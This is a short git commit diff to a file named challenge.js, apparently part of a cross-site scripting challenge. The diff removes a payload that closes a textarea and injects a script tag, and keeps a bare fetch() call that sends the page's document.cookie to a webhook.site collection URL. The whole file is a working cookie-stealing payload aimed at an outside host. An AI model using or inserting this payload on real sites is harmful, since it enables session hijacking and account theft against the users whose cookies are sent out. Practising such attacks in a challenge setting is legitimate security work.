c7b5589f4ada49f9f34823b339c9cf44b53a3716
ricardoespadinha <93793046+ricardoespadinha@users.noreply.github.com>
2024-12-06 17:09:37 +0000

    Update challenge.js

--- challenge.js
+++ challenge.js
@@ -1,3 +1,1 @@
-</textarea><script>
-    fetch('https://webhook.site/a05e1bec-5604-498a-b5ac-afc5812272b8/?cookie=' + document.cookie);
-</script>
+fetch('https://webhook.site/a05e1bec-5604-498a-b5ac-afc5812272b8/?cookie=' + document.cookie);
